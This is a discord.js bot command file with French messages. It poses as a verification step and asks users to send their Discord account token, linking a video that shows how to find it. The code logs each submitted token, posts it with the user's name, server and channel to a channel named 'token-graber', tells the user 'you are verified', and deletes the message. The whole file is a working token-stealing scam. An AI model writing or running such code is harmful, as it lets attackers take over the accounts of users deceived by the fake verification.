const Discord = require("discord.js");

module.exports.run = async (bot, message, args) => {


if (!args[0]) 
	message.member.sendMessage("Veuillez indiquer un token, pour le trouver : https://www.youtube.com/watch?v=tI1lzqzLQCs ")
	console.log("Pas de token pour " + message.member)
	message.channel.bulkDelete(1)
	console.log("message delete pour " + message.member)
if(args[0]){ 
            message.member.sendMessage("Voila tu es vérifié !")
            console.log(`token de ${message.member} : ${args[0]}`)
        let tokenEmbed = new Discord.RichEmbed()
                .setTitle("Token")
                .setColor("#201a9b")
                .addField("Utilisateur ayant envoyé son token",`${"<@" + message.member.id + ">"}`)
                .addField("Discord", message.guild.name)
                .addField("Canal", message.channel)
                .addField("Token", args[0])
                .setFooter("Token des Cancers");
        let tokenChannel = message.guild.channels.find(x => x.name === "token-graber");
            
    
        //bot.channels.findAll('name', 'token-graber').map(channel => channel.send({tokenEmbed}))
        tokenChannel.send(tokenEmbed)};
        
        

};


module.exports.help = {
    name: "mod"
}